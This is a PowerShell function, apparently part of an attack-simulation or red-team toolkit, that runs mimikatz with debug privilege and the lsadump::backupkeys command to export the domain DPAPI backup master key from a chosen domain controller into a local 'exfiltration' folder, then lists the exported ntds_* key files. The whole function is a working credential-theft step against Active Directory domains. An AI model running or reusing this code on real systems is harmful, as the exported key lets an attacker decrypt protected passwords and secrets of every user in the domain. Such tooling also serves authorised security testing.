function Start-ExportDPAPIMasterKey {

    ################################################################################
    #####                                                                      ##### 
    #####    Export DPAPI Master Key from a Domain Controller using Mimikatz.  #####                                
    #####                                                                      #####
    ################################################################################

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################

    New-Item $Script:DefautExfiltrationFolder -ItemType directory -ErrorAction Ignore
    
    $dn = Select-ADObject -DomainSelectionOnly -Title "Select Domain to get a Domain Controller for DPAPI Master Key Export"
    $server = Get-BestDomainController -domain $dn
    
    Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "cd $Script:DefautExfiltrationFolder" "privilege::debug" "lsadump::backupkeys /system:$server /export" "exit" }
    
    get-item "$Script:DefautExfiltrationFolder\ntds_*" | Sort-Object LastWriteTime -Descending | out-host
    
    Invoke-output -type Success -Message "DPAPI Master Key Exported to $Script:DefautExfiltrationFolder from DC '$server'."
    
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    
    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}